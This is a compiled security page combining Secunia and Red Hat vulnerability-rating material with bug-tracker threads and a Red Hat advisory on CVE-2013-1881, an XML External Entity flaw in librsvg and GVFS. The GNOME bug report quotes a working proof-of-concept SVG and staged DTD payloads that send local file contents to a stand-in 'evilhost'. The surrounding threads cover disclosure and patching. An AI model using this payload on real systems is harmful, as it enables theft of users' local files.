How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

| [Description](show_bug.cgi?id=691708#c0)  Yury    2013-01-14 11:48:02 UTC  ``` ---[ Vulnerable software]          GVFS                Version 1.14.2 and possibly others  ---[ Vulnerability description] Positive Research experts have detected a local resources access vulnerability (files and internal network resources) via  XML External Entity enabled in GVFS. An attacker is able to give a user a specially crafted file. If he or she views a folder with the file or opens it, GVFS sends local resource's contents  to the attacker's server.  Here is an example of evil.svg file that should be loaded by a target user:  <?xml version="1.0" encoding="UTF-8" standalone="no"?> <!DOCTYPE svg [ <!ENTITY % external SYSTEM "<http://evilhost/step_one>"> %external; %intern; %trick; ]> <svg version="1.1"      baseProfile="full"      xmlns="<http://www.w3.org/2000/svg>"      xmlns:xlink="<http://www.w3.org/1999/xlink>"      xmlns:ev="<http://www.w3.org/2001/xml-events>"      width="100%" height="100%"> <rect fill="white" x="0" y="0" width="100%" height="100%" /> <rect fill="silver" x="0" y="0" width="100%" height="100%" rx="1em" /> </svg>  An example of <http://evilhost/step_one> script:  <!ENTITY % deeper SYSTEM "<http://evilhost/step_two>"> %deeper; <!ENTITY % intern "<!ENTITY &#37; trick SYSTEM '<http://evilhost/?log=%payload3>;'>">  An example of <http://evilhost/step_two> script:  <!ENTITY % payload SYSTEM "<http://local_net/text.txt>"> <!ENTITY % payload2 "<!ENTITY &#37; payload3 '%payload;'>"> %payload2;  This script passes <http://local_net/text.txt> file contents to <http://evilhost/?log>=.  --[Solution] We recommend you to disable External Entities, External Parameter Entities and External Doctype support.  ---[Credits] Vulnerability was detected by Timur Yunusov and Alexey Osipov (Positive Research Center) ``` [Comment 1](show_bug.cgi?id=691708#c1)  Christian Persch    2013-01-14 12:59:51 UTC  ``` (In reply to [comment #0](show_bug.cgi?id=691708#c0)) > Here is an example of evil.svg file that should be loaded by a target user:  Loaded how? I tried this in rsvg-view-3 and it doesn't 'work'. Which svg loading programme did you test this with? ``` [Comment 2](show_bug.cgi?id=691708#c2)  Yury    2013-01-15 06:10:36 UTC  ``` File should exist on target machine, for example by means of downloading from malicious website. Then when user opens directory containing evil.svg with Nautilus (not specially by Nautilus, but also software which create thumbnails with gvfs). When thumbnail for svg is created by gvfs there would be access to remote webserver enabling attacker to read local file system of the victim. ``` [Comment 3](show_bug.cgi?id=691708#c3)  Bastien Nocera    2013-01-15 07:09:49 UTC  ``` It has nothing to do with gvfs then, but with librsvg the RSVG library (ultimately) used to create thumbnails. ``` [Comment 4](show_bug.cgi?id=691708#c4)  Yury    2013-02-26 12:47:47 UTC  ``` Can you clarify vulnerability status?  You can understand our interest in this information, because during upcoming BlackHat Europe 2013 conference we are going to disclose information about the technique, which led us to discovery this vulnerability. Our presentation wonât be vendor-specific because we honor responsible disclosure principles, but knowledge about general method can provoke other researchers to look through your products. And as we want to mitigate any issues concerning this fact, we would like to know, whether we can provide you any support or suggest temporary work-around, until a patch will be put in place. ``` [Comment 5](show_bug.cgi?id=691708#c5)  Christian Persch    2013-02-26 13:06:53 UTC  ``` Created [attachment 237433](attachment.cgi?id=237433 "io: Use XML_PARSE_NONET") [[details]](attachment.cgi?id=237433&action=edit "io: Use XML_PARSE_NONET") [[review]](review?bug=691708&attachment=237433) io: Use XML_PARSE_NONET  We don't want to load resources off the net.

Attached patches should fix this, but the 2nd one might be too restrictive? It limits all xlink:href loads to only allowing data: URIs ; not sure if there are files out there that rely on loading from elsewhere? I though about adding a more general 'same origin' check that would check the xlink:href URI against the file's URI (like mozilla's same origin checks)... ``` [Comment 8](show_bug.cgi?id=691708#c8)  Christian Persch    2013-03-03 19:18:31 UTC  ``` Created [attachment 237891](attachment.cgi?id=237891 "io: Implement strict load policy") [[details]](attachment.cgi?id=237891&action=edit "io: Implement strict load policy") [[review]](review?bug=691708&attachment=237891) io: Implement strict load policy  Only allow loads from data: and resource:, and from file: below the directory of the SVG file itself.

Since resources can be added at any path, I don't think a path-based check like for file: would add any extra security here, so I left it at allowing resource: to load any other resource:.  Do you think I can just commit & release this, or do I need to do the CVE & coordinated release dance? ``` [Comment 13](show_bug.cgi?id=691708#c13)  Vincent Danen    2013-03-14 19:23:59 UTC  ``` Matthias cc'd me on this issue, but I never asked -- have you guys reached out to MITRE or anyone for a CVE name?  Do you need one assigned?  I can do that for you if you've not gotten one already.  I suspect this should be coordinated... it's pretty bad to send arbitrary local files to a remote server. ``` [Comment 14](show_bug.cgi?id=691708#c14)  Christian Persch    2013-03-21 13:08:20 UTC  ``` We haven't, no.  Since you said in [comment 4](show_bug.cgi?id=691708#c4) that you'd present this at a conference that by now has already been held, is this bug now publicly known? If so, I'd just remove the protect bit and commit the patches. ``` [Comment 15](show_bug.cgi?id=691708#c15)  Vincent Danen    2013-03-21 17:52:17 UTC  ``` [Comment 4](show_bug.cgi?id=691708#c4) wasn't mine.  =)  I've assigned this CVE-2013-1881.  Please reference it in any commits.  It would indeed be good to know whether or not this has been disclosed at that conference, however. ``` [Comment 16](show_bug.cgi?id=691708#c16)  Christian Persch    2013-03-21 18:05:32 UTC  ``` Sorry, my mistake :-)  I'd like to include this in rsvg 2.38 which is due next monday. (I'll also commit them to 2-36 and do a 2.36.x release, too.) So it would be good to have confirmation that these patches fix the whole problem (I think they do). And also would be great to check that they don't break anything in gnome (I don't have a full build and therefore cannot test this); afaik no gnome icons or artwork uses external references. ``` [Comment 17](show_bug.cgi?id=691708#c17)  Vincent Danen    2013-03-21 18:18:38 UTC  ``` Do we know how far back this goes?  Or is this something that's always existed?  We do have an older version of librsvg2 in RHEL, but I've not had an opportunity to look to see if it's likewise affected. ``` [Comment 18](show_bug.cgi?id=691708#c18)  Christian Persch    2013-03-21 18:32:31 UTC  ``` The part that is fixed by adding XML_PARSE_NONET has existed forever (well, when used with a libxml2 that has remote loading enabled, which I don't know when it was added).  As for the part where librsvg is itself resolving the URI and loading the stuff using GIO / GVFS / libgnomevfs exists since commit [07ef3d5ff75930730b5efa12a0c24f62939a4b71](https://git.gnome.org/browse/librsvg/commit/?id=07ef3d5ff75930730b5efa12a0c24f62939a4b71) (from 2004), so practically forever too (although older versions may or may not be exhibit the exploit). ``` [Comment 19](show_bug.cgi?id=691708#c19)  Huzaifa Sidhpurwala (Red Hat Security Response)    2013-04-08 05:37:35 UTC  ``` I dont see any fixes for this one? Any idea what the plan is? ``` [Comment 20](show_bug.cgi?id=691708#c20)  Christian Persch    2013-04-08 12:38:26 UTC  ``` The fixes are in the 2 patches attached here.  What remains to be done is: * Test they really fix the alleged exploit * Test they don't regress anything in Gnome * Decide whether to just release or do coordinated release   My vote is on 'just release'. I don't have a working version of the alleged exploit, so I cannot test that; and I don't have a full jhbuild of Gnome so I can't test that part either. ``` [Comment 21](show_bug.cgi?id=691708#c21)  Christian Persch    2013-05-12 21:12:13 UTC  ``` I'll commit the attached patches and release librsvg with them for tomorrow's gnome 3.8.2 release, unless someone has a strong objection. ``` [Comment 22](show_bug.cgi?id=691708#c22)  Christian Persch    2013-08-16 12:49:31 UTC  ``` Released as 2.39.0. Despite the odd minor version, it should be stable enough to put into 3.8 too. ``` [Comment 23](show_bug.cgi?id=691708#c23)  Vincent Danen    2013-08-16 15:14:17 UTC  ``` Is this patch pertinent to resolve this as well?  <https://git.gnome.org/browse/librsvg/commit/?id=56d0018d911eb5783f22125d9893fce075778c64> (io: Resolve relative URIs)  Also, can this be considered public now? ``` [Comment 24](show_bug.cgi?id=691708#c24)  Christian Persch    2013-08-16 15:42:08 UTC  ``` That commit is related but _not_ part of the fix of this bug.  I guess the issue itself can be considered public, not sure if the bug should be opened already. ``` [Comment 25](show_bug.cgi?id=691708#c25)  Vincent Danen    2013-08-16 15:53:59 UTC  ``` Ok, great, thanks for clarifying that, Christian.  I would just like to know whether or not we can open our bug regarding this.  Ideally it would be nice to open this bug as well, but our bug is also closed and we would like to open it -- _if_ this issue can be considered public now (the commits don't indicate security or mention a CVE, but it probably won't take long for someone paying attention to realize it's a security fix).  Having said that, I don't want to open ours yet in case you need/want to do something else here that should delay us making it public. ``` [Comment 26](show_bug.cgi?id=691708#c26)  Christian Persch    2013-08-16 21:33:44 UTC  ``` Turns out this change totally broke gtk+ symbolic icons.  gtk+/gtk/gtkicontheme.c:_gtk_icon_info_load_symbolic_internal() constructs svg as a memory stream, containing some CSS, then xi:include'ing the real svg, and loads the thing via gdk-pixbuf. That means there's no way to tag this stream with an 'origin' so that it could allow the access to the file: URI. ``` [Comment 27](show_bug.cgi?id=691708#c27)  Christian Persch    2013-08-17 09:47:46 UTC  ``` Fixed in [https://git.gnome.org/browse/gtk+/commit/?id=7b4f82ccc6c180b809cd3b7b6582394ce741a14e](https://git.gnome.org/browse/gtk%2B/commit/?id=7b4f82ccc6c180b809cd3b7b6582394ce741a14e) . ``` [Comment 28](show_bug.cgi?id=691708#c28)  Vincent Danen    2013-08-19 20:17:10 UTC  ``` Can we make our bug and the CVE public now? ``` [Comment 29](show_bug.cgi?id=691708#c29)  Vincent Danen    2013-08-19 20:17:11 UTC  ``` Can we make our bug and the CVE public now? ``` [Comment 30](show_bug.cgi?id=691708#c30)  Christian Persch    2013-09-14 12:48:48 UTC  ``` No objection from me. ``` [Comment 31](show_bug.cgi?id=691708#c31)  Vincent Danen    2013-09-17 07:11:57 UTC  ``` Thanks.  It's public now:  <https://bugzilla.redhat.com/show_bug.cgi?id=924414> ``` [Comment 32](show_bug.cgi?id=691708#c32)  Gerhard Schaden    2016-09-12 12:23:47 UTC  ``` Hi,  I think that the bugfix made for this report breaks loading files at all  <https://github.com/GNOME/librsvg/commit/f01aded72c38f0e18bc7ff67dee800e380251c8e#diff-0da2210ce50c01c306244f696531dc4fR2212>  I cannot find any way how to specify file includes without breaking one of this rules. ``` |  |

## Synopsis

Moderate: librsvg2 security update

## Type/Severity

Security Advisory: Moderate

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2014%3A0127)

## Topic

Updated librsvg2 packages that fix one security issue are now available for
Red Hat Enterprise Linux 6.

The Red Hat Security Response Team has rated this update as having moderate
security impact. A Common Vulnerability Scoring System (CVSS) base score,
which gives a detailed severity rating, is available from the CVE link in
the References section.

[Updated Feb 4, 2014]
The original packages distributed with this advisory contained a bug that
caused applications using librsvg2 to crash when loading certain SVG
images. We have updated the packages to correct this bug.

## Description

The librsvg2 packages provide an SVG (Scalable Vector Graphics) library
based on libart.

An XML External Entity expansion flaw was found in the way librsvg2
processed SVG files. If a user were to open a malicious SVG file, a remote
attacker could possibly obtain a copy of the local resources that the user
had access to. (CVE-2013-1881)

All librsvg2 users are advised to upgrade to these updated packages, which
contain a backported patch to correct this issue. All running applications
that use librsvg2 must be restarted for this update to take effect.

## Solution

Before applying this update, make sure all previously released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to use the
Red Hat Network to apply this update are available at
<https://access.redhat.com/site/articles/11258>

| [Description](show_bug.cgi?id=924414#c0)  Vincent Danen    2013-03-21 18:07:04 UTC  ``` It was reported [1] that librsvg2, via gnome-vfs, is vulnerable to a local resource access vulnerability via XML External Entity expansion.  If a user were to view a folder containing a malicious SVG file, or open the file, GVFS would send the local resource's contents to the attacker's server.  A patch [2] is attached to the bug report which restricts what is permitted to be loaded.

| [Description](show_bug.cgi?id=840753#c0)  Alexander Bergmann   2013-09-17 08:19:33 UTC  ``` Public via Red Hat.  <https://bugzilla.redhat.com/show_bug.cgi?id=924414>  It was reported [1] that librsvg2, via gnome-vfs, is vulnerable to a local resource access vulnerability via XML External Entity expansion.  If a user were to view a folder containing a malicious SVG file, or open the file, GVFS would send the local resource's contents to the attacker's server.  A patch [2] is attached to the bug report which restricts what is permitted to be loaded.  [1] <https://bugzilla.gnome.org/show_bug.cgi?id=691708> [2] <https://bug691708.bugzilla-attachments.gnome.org/attachment.cgi?id=238516&t=9sD7BFBKk1>  CVE-2013-1881 was assigned for this issue.  Fixes:  <https://git.gnome.org/browse/librsvg/commit/?id=d83e426fff3f6d0fa6042d0930fb70357db24125> <https://git.gnome.org/browse/librsvg/commit/?id=f01aded72c38f0e18bc7ff67dee800e380251c8e>  Regression fix in gtk+:  [https://git.gnome.org/browse/gtk+/commit/?id=7b4f82ccc6c180b809cd3b7b6582394ce741a14e](https://git.gnome.org/browse/gtk%2B/commit/?id=7b4f82ccc6c180b809cd3b7b6582394ce741a14e) ``` [Comment 1](show_bug.cgi?id=840753#c1)  Swamp Workflow Management   2013-09-17 22:00:10 UTC  ``` bugbot adjusting priority ``` [Comment 2](show_bug.cgi?id=840753#c2)  Scott Reeves   2013-10-08 00:39:54 UTC  ``` I have fixes ready for 12.2 and 12.3. Note that the regression fix in gtk+ listed above was not sufficient and required an update committed last week (3d602f5). We might want to wait a little longer for upstream testing to continue before releasing...  Back porting these fixes for our SLE code base is proving quite involved. Still working on this... ``` [Comment 3](show_bug.cgi?id=840753#c3)  Scott Reeves   2013-10-18 19:11:40 UTC  ``` I have not been able to duplicate this vulnerability so it's hard to test if the fixes work. In my constructed svg file I can not get the parsing libraries to send the contents of a local network resource to my "evil" server. I get parameter references forbidden in internal subset errors which it seems like is the supposed hole this bug tries to exploit.  I tried with the setup detailed in the upstream bug and also found a (I presume affiliated with the reporters of this bug) blackhat 2013 presentation - <http://www.slideshare.net/qqlan/bh-ready-v4>.  Federico - can you help look into this. I will send you my setup so far (and my fixes for 12.2 and 12.3 are in my home:sreeves1:branch) ``` [Comment 4](show_bug.cgi?id=840753#c4)  Federico Mena Quintero   2013-10-21 20:45:34 UTC  ``` I'm on this. ``` [Comment 5](show_bug.cgi?id=840753#c5)  Federico Mena Quintero   2013-11-07 00:42:15 UTC  ``` Scott is right; backporting all the changes done to librsvg to sanitize the "load data" path is quite complicated.  First they abstracted out I/O, then a lot of changes resulted because of that.  I don't feel comfortable backporting all of this and not having all the intermediate fixes to the rest of the code.
